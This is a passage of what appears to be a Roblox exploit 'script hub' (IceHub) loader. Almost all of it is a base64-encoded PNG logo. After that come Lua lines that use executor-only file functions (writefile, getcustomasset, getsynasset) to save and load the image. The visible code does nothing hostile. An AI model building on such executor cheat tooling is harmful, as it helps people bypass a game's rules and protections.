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"))
															end

															png = getcustomasset("icehub_logo.png")
														elseif writefile and getsynasset then
															if not (isfile and isfile("icehub_logo.png")) then
																writefile("icehub_logo.png", fn51("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